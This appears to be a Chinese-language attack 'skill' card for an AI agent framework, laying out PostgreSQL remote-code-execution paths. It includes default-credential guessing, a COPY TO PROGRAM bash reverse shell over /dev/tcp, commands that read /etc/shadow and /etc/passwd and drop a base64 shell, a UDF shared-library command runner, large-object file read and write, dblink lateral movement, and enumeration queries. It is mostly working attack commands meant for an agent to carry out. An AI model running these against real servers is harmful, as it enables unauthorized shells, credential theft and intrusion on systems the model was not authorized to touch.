---
name: 'postgresql-rce'
description: 'PostgreSQL RCE全路径：COPY FROM PROGRAM/UDF扩展/Large Object读写/pg_read_file/CVE-2019-9193（检索词：postgresql rce）'
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## PostgreSQL RCE 攻击

### 识别
- 端口 5432 对外开放
- 弱密码/默认凭据: `postgres:postgres`, `postgres:password`

### 路径 A: COPY … TO/FROM PROGRAM（9.3+，需要 superuser）
> 📌 **权限前提（全卡唯一口径）**：需要**数据库超级用户 superuser**。下节「路径 F: CVE-2019-9193」用的是
> **同一条命令**（同一命令的两种叫法），不是第二条路径；superuser-only 一句按 PostgreSQL 官方文档口径，本机未实测权限边界。
```sql
-- 直接执行命令
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"';

-- 读文件
COPY (SELECT '') TO PROGRAM 'cat /etc/shadow';

-- 写文件
COPY (SELECT 'base64 blob') TO PROGRAM 'base64 -d > /tmp/shell';

-- 如果 COPY 被禁用 → 尝试 CREATE TABLE + COPY
CREATE TABLE cmd_output(output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

### 路径 B: UDF 扩展（9.3+，需要 superuser + 编译环境）
```sql
-- 编译共享库
-- Kali: searchsploit -m 1518  (raptor_udf.c 改 pg 版本)
-- 或者: git clone https://github.com/Dionach/postgres_udf_help

-- 上传 so 到 /tmp
-- 通过 lo_import 或 COPY 写入
SELECT lo_import('/tmp/pg_udf.so');
SELECT lo_export(loid, '/tmp/pg_udf.so');

-- 加载并执行
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/pg_udf.so', 'sys_eval' LANGUAGE c STRICT;
SELECT sys_eval('id');
```

### 路径 C: Large Objects (lo_*) 文件读写
```sql
-- 读文件
SELECT lo_import('/etc/passwd');
SELECT lo_get(loid);

-- 写文件
SELECT lo_from_bytea(0, decode('base64payload', 'base64'));
SELECT lo_export(loid, '/tmp/outfile');
```

### 路径 D: pg_read_file 读文件（PG ≥ 9.3，superuser）
```sql
-- 读文件
SELECT pg_read_file('/etc/passwd', 0, 1000);
```
> ⚠️ 原卡此处并列的写文件写法 `SELECT pg_write_file(...)` 已**删除**：`pg_write_file()` **未核实**为 PostgreSQL 内置函数
> （若不是内置的，直接报 `function pg_write_file(...) does not exist`），本机无 PG 实例可实测，故不保留不可核实的函数名。
> 写文件请走「路径 C: Large Objects + `lo_export`」或「路径 A: `COPY … TO PROGRAM`」。

### 路径 E: dblink 扩展 → 出网横向
```sql
CREATE EXTENSION dblink;
SELECT dblink_connect('host=internal-server port=5432 user=postgres password=pass dbname=postgres');
SELECT * FROM dblink('SELECT 1') AS t(i INT);
-- → 横向移动
```

### 路径 F: CVE-2019-9193 —— 与「路径 A」同一条命令（不是新路径）
> 该 CVE 的利用命令与「路径 A: COPY … TO/FROM PROGRAM」**完全相同**，本节只是同一命令的别名入口。
> 原卡在此处另写「如果权限不足 → 提权需 superuser 或 CREATEROLE」，与路径 A 的「需要 superuser」**自相矛盾**，已剔除：
> 本条路径的权限前提同样只有一句 —— **需要 superuser**。
> （该 CVE 是否有额外的版本/配置边界、以及 `CREATEROLE` 能否替代 superuser：**未核实**，不作断言。）
```sql
COPY (SELECT '') TO PROGRAM 'id';   -- 与路径 A 同一命令
```

### 枚举
```bash
# 连接
psql -h target -U postgres -d postgres

# 版本
SELECT version();

# 当前用户
SELECT current_user;
SELECT session_user;

# 数据库列表
\l

# 所有用户/角色
\du
SELECT usename, usesuper FROM pg_user;

# 权限
SELECT * FROM pg_roles;
SHOW data_directory;
```
